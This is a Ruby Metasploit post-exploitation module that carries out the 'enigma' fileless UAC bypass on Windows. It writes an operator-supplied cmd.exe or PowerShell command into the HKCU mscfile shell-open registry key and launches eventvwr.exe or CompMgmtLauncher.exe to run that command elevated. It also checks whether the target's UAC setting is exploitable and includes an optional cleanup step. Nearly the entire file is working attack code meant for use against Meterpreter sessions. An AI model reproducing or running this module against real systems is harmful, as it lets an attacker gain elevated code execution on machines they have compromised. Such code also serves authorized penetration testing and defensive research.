require 'rex'
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'




# ----------------------------------
# Metasploit Class name and includes
# ----------------------------------
class MetasploitModule < Msf::Post
      Rank = ExcellentRanking

         include Msf::Post::Common
         include Msf::Post::Windows::Priv
         include Msf::Post::Windows::Error
         include Msf::Post::Windows::Registry




# -----------------------------------------
# Building Metasploit/Armitage info GUI/CLI
# -----------------------------------------
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'enigma fileless uac bypass [registry hijacking]',
                        'Description'   => %q{
                                        Implementation of fileless uac bypass by enigma and mattifestation using cmd.exe OR powershell.exe to execute our command. This module will create the required registry entry in the current user’s hive, set the default value to whatever you pass via the EXEC_COMMAND parameter, and runs eventvwr.exe OR CompMgmtLauncher.exe (hijacking the process being started to gain code execution).
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                        'Vuln discover: enigma0x3 | mattifestation',  # vulnerability credits
                                ],
 
                        'Version'        => '$Revision: 2.1',
                        'DisclosureDate' => 'mar 16 2017',
                        'Platform'       => 'windows',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'false',   # thats no need for privilege escalation..
                        'Targets'        =>
                                [
                                         # Tested againts windows 7 | Windows 10
                                         [ 'Windows VISTA', 'Windows 7', 'Windows 8', 'Windows 9', 'Windows 10' ]
                                ],
                        'DefaultTarget'  => '5', # default its to run againts windows 10
                        'References'     =>
                                [
                                         [ 'URL', 'POC: goo.gl/XHQ6aF' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it' ],
                                         [ 'URL', 'http://x42.obscurechannel.com/?p=368' ],
                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ]


                                ],
			'DefaultOptions' =>
				{
                                         'SESSION' => '1',              # Default its to run againts session 1
                                         'VULN_SOFT' => 'eventvwr.exe', # Default its to run againts eventvwr.exe
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptString.new('EXEC_COMMAND', [ false, 'The command to be executed (eg start notepad.exe)']),
                                OptBool.new('CHECK_VULN', [ false, 'Check target vulnerability status/details?' , false])
                        ], self.class)

                register_advanced_options(
                        [
                                OptString.new('VULN_SOFT', [ false, 'The binary/service vulnerable (eg CompMgmtLauncher.exe)']),
                                OptBool.new('USE_POWERSHELL', [ false, 'Use powershell.exe -Command to execute our command?' , false]),
                                OptBool.new('DEL_REGKEY', [ false, 'Delete malicious registry hive/keys?' , false])
                        ], self.class) 

        end




# -------------------------------------------------------
# GAIN REMOTE CODE EXCUTION BY HIJACKING EVENTVWR PROCESS
# -------------------------------------------------------
def ls_stage1

session = client
# arch = client.fs.file.expand_path("%ComSpec%")
# check target arch (to inject into powershell string)
arch_check = client.fs.file.expand_path("%Windir%\\SysWOW64")
if arch_check == "C:\\Windows\\SysWOW64"
  arch = "SysWOW64"
else
  arch = "System32"
end

  r=''
  vul_serve = datastore['VULN_SOFT'] # vulnerable soft to be hijacked
  exec_comm = datastore['EXEC_COMMAND'] # my cmd command to execute (OR powershell)
  uac_level = "ConsentPromptBehaviorAdmin" # uac level key
  comm_path = "%SystemRoot%\\#{arch}\\cmd.exe /c" # cmd.exe %comspec% path
  regi_hive = "REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" # registry hive key to be hijacked
  psh_comma = "%SystemRoot%\\#{arch}\\WindowsPowershell\\v1.0\\powershell.exe -Command" # use_powershell advanced option command
  uac_hivek = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" # uac hive key
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options...
  if datastore['EXEC_COMMAND'] == 'nil'
    print_error("Options not configurated correctly...")
    print_warning("Please set EXEC_COMMAND option!")
    return nil
  else
    print_status("Hijacking #{vul_serve} process!")
    Rex::sleep(1.5)
  end

    # search in target regedit if binary calls mmc.exe
    print_warning("Reading process registry hive keys...")
    Rex::sleep(1.0)
    if registry_enumkeys("HKCR\\mscfile\\shell\\open\\command")
      print_good(" exec => remote registry hive key found!")
      Rex::sleep(1.0)
    else
      # registry hive key not found, aborting module execution.
      print_warning("Hive key: HKCR\\mscfile\\shell\\open\\command (mmc.exe call)")
      print_error("[ABORT]: module cant find the registry hive key needed...")
      print_error("System does not appear to be vulnerable to the exploit code!")
      print_line("")
      Rex::sleep(1.0)
      return nil
    end

      # check target UAC settings (always notify - will abort module execution)
      check_success = registry_getvaldata("#{uac_hivek}","#{uac_level}")
      # a dword:2 value it means 'always notify' setting is active.
      if check_success == 2
        print_warning("Target UAC set to: #{check_success} (always notify)")
        print_error("[ABORT]: module can not work under this condictions...")
        print_error("Remote system its not vulnerable to the exploit code!")
        print_line("")
        Rex::sleep(1.0)
        return nil
      # a dword:nil value it means that we are running againts a 'non-uac-system'
      elsif check_success.nil?
        print_warning("UAC DWORD DATA EMPTY (NON-UAC-SYSTEM?)")
        print_error("[ABORT]: module can not work under this condictions...")
        print_error("Remote system its not vulnerable to the exploit code!")
        print_line("")
        Rex::sleep(1.0)
        return nil
      else
        # all good in UAC settings :D
        print_good(" exec => Target UAC set to: #{check_success} (exploitable)")
        Rex::sleep(1.0)
      end

        #
        # chose to execute a single command in cmd.exe interpreter
        # or to execute a command using powershell.exe interpreter
        #
        if datastore['USE_POWERSHELL'] == true
          comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{psh_comma} #{exec_comm}\" /f"
          print_good(" exec => Creating registry powershell command data")
          print_good("   data: #{psh_comma} #{exec_comm}")
          Rex::sleep(1.0)
        else
          comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{comm_path} #{exec_comm}\" /f"
          print_good(" exec => Creating registry cmd command data")
          print_good("   data: #{comm_path} #{exec_comm}")
          Rex::sleep(1.0)
        end

 # Execute process hijacking in registry (cmd.exe OR powershell.exe)...
 # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "C:\Windows\powershell.exe -Command start notepad.exe" /f
 # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "C:\Windows\System32\cmd.exe /c start notepad.exe" /f
 print_good(" exec => Hijacking process to gain code execution ..")
 r = session.sys.process.execute("cmd.exe /c #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
 # give a proper time to refresh regedit 'enigma0x3' :D
 Rex::sleep(4.0)

      # start remote service to gain code execution
      print_good(" exec => Starting #{vul_serve} native process ..")
      r = session.sys.process.execute("cmd.exe /c start #{vul_serve}", nil, {'Hidden' => true, 'Channelized' => true})
      Rex::sleep(1.0)

    # close channel when done
    print_status("UAC-RCE Credits: enigma0x3 + @mattifestation")
    print_line("")
    r.channel.close
    r.close

  # error exception funtion
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end




# ----------------------------------------------------
# DELETE MALICIOUS REGISTRY ENTRY (process hijacking)
# ----------------------------------------------------
def ls_stage2

  r=''
  session = client
  reg_clean = "REG DELETE HKCU\\Software\\Classes\\mscfile /f" # registry hive to be clean
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options...
  if datastore['DEL_REGKEY'] == 'nil'
    print_error("Options not configurated correctly ..")
    print_warning("Please set DEL_REGKEY option!")
    return nil
  else
    print_status("Revert binary.exe process hijack!")
    Rex::sleep(1.5)
  end

    # search in target regedit if hijacking method allready exists
    print_warning("Reading process registry hive keys ..")
    Rex::sleep(1.0)
    if registry_enumkeys("HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
      print_good(" exec => Remote registry hive key found!")
      Rex::sleep(1.0)
    else
       # registry hive key not found, aborting module execution.
       print_warning("Hive key: HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
       print_error("[ABORT]: module cant find the registry hive key needed ..")
       print_error("System does not appear to be vulnerable to the exploit code!")
       print_line("")
       Rex::sleep(1.0)
       return nil
    end

 # Delete hijacking hive/keys from target regedit...
 # REG DELETE HKCU\Software\Classes /f -> mscfile\shell\open\command
 print_good(" exec => Deleting HKCU hive registry keys ..")
 print_good(" exec => cmd.exe /c #{reg_clean}")
 r = session.sys.process.execute("cmd.exe /c #{reg_clean}", nil, {'Hidden' => true, 'Channelized' => true})
 # give a proper time to refresh regedit
 Rex::sleep(3.0)

      # check if remote registry hive keys was deleted successefuly
      if registry_enumkeys("HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
        print_error("Module can not verify if deletion has successefully!")
      else
        print_status("Registry hive keys deleted successefuly!")
      end

    Rex::sleep(1.0)
    # close channel when done
    print_status("process hijack reverted to default stage!")
    print_line("")
    r.channel.close
    r.close

  # error exception funtion
  rescue ::Exception => e
  print_error("Error: #{e.class} #{e}")
end




# -------------------------------------------
# CHECK TARGET VULNERABILITY STATUS/EXISTANCE
# -------------------------------------------
def ls_stage3

  r=''
  session = client
  oscheck = client.fs.file.expand_path("%OS%")
  vuln_soft = datastore['VULN_SOFT'] # vulnerable soft to be hijacked
  uac_level = "ConsentPromptBehaviorAdmin" # uac level key
  vuln_hive = "HKCR\\mscfile\\shell\\open\\command" # vulnerable hive key call (mmc.exe)
  vuln_key = "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" # vuln hijack key
  uac_hivek = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" # uac hive key
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options...
  if datastore['CHECK_VULN'] == 'nil'
    print_error("Options not configurated correctly...")
    print_warning("Please set CHECK_VULN option!")
    return nil
  else
    print_status("Checking target vulnerability details!")
    Rex::sleep(1.5)
  end

    print_warning("Reading process registry hive keys ..")
    Rex::sleep(2.0)
    # check target registry hive/key settings (mmc.exe call)
    if registry_enumkeys("HKCR\\mscfile\\shell\\open\\command")
      report_on = "EXPLOITABLE"
    else
      vuln_hive = "NOT FOUND"
      report_on = "NOT EXPLOITABLE"
    end

      # check target registry hive/key settings (hijacking key)
      if registry_enumkeys("HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
        report_tw = "HIJACK HIVE ACTIVE"
      else
        vuln_key = "NOT FOUND"
        report_tw = "HIJACK HIVE NOT PRESENT"
      end

    # check target registry hive/key settings (UAC level settings)
    check_uac = registry_getvaldata("#{uac_hivek}","#{uac_level}")
    # a dword:2 value it means 'always notify' setting is active.
    if check_uac == 2
      report_level = "ALWAYS NOTIFY (NOT EXPLOITABLE)"
    # a dword:nil value it means that we are running againts a 'non-uac-system'
    elsif check_uac.nil?
      report_level = "DWORD DATA EMPTY (NON-UAC-SYSTEM?)"
    else
      # all good in UAC settings :D
      report_level = "#{check_uac} (EXPLOITABLE)"
    end

      # obsolect 'def run' allready checks for OS compatiblity.
      if oscheck.nil?
        oscheck = "NOT COMPATIBLE SYSTEM"
      end

    print_line("")
    # display target registry settings to user...
    # i hope you are smart enouth to recognise a vulnerable output :D
    print_line("VULNERABLE_SOFT : #{vuln_soft}")
    print_line("    TARGET_OS   : #{oscheck}")
    print_line("    UAC_LEVEL   : #{report_level}")
    print_line("")
    print_line("    VULN_HIVE   : #{vuln_hive}")
    print_line("    KEY_INFO    : #{report_on}")
    print_line("")
    print_line("    HIJACK_HIVE : #{vuln_key}")
    print_line("    KEY_INFO    : #{report_tw}")
    print_line("")
    print_line("")


  # building better report outputs
  if report_on == "EXPLOITABLE"
    print_line("    REPORT : System reports that vulnerability its present: [HKCR]")
  else
    print_line("    REPORT : System reports vulnerability NOT present under [HKCR]")
  end
  if vuln_key == "NOT FOUND"
    print_line("    REPORT : None hijacking registry key was found under -> [HKCU]")
    print_line("           : that allows local/remote-code execution (enigma bypass)")
  else
    print_line("    REPORT : Hijacking method its active, waiting for #{vuln_soft}")
    print_line("           : execution to run injected string in target machine...")
  end

print_line("")
end




# ------------------------------------------------
# MAIN DISPLAY WINDOWS (ALL MODULES - def run)
# Running sellected modules against session target
# ------------------------------------------------
def run
  session = client

      # Variable declarations (msf API calls)
      oscheck = client.fs.file.expand_path("%OS%")
      sysnfo = session.sys.config.sysinfo
      runtor = client.sys.config.getuid
      runsession = client.session_host
      directory = client.fs.dir.pwd



    # Print banner and scan results on screen
    print_line("    +----------------------------------------------+")
    print_line("    | enigma fileless UAC bypass command execution |")
    print_line("    |            Author : r00t-3xp10it             |")
    print_line("    +----------------------------------------------+")
    print_line("")
    print_line("    Running on session  : #{datastore['SESSION']}")
    print_line("    Computer            : #{sysnfo['Computer']}")
    print_line("    Operative System    : #{sysnfo['OS']}")
    print_line("    Target IP addr      : #{runsession}")
    print_line("    Payload directory   : #{directory}")
    print_line("    Client UID          : #{runtor}")
    print_line("")
    print_line("")


    #
    # the 'def check()' funtion that rapid7 requires to accept new modules.
    # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
    #
    # check for proper operative system (windows-not-wine)
    if not oscheck == "Windows_NT"
      print_error("[ ABORT ]: This module only works againts windows systems")
      return nil
    end
    # check for proper session (meterpreter)
    # the non-return of sysinfo command reveals
    # that we are not on a meterpreter session!
    if not sysinfo.nil?
      print_status("Running module against: #{sysnfo['Computer']}")
    else
      print_error("[ ABORT ]: This module only works against meterpreter sessions!")
      return nil
    end
    # elevate session privileges befor runing options
    client.sys.config.getprivs.each do |priv|
    end


# ------------------------------------
# Selected settings to run
# ------------------------------------
      if datastore['EXEC_COMMAND']
         ls_stage1
      end

      if datastore['DEL_REGKEY']
         ls_stage2
      end

      if datastore['CHECK_VULN']
         ls_stage3
      end
   end
end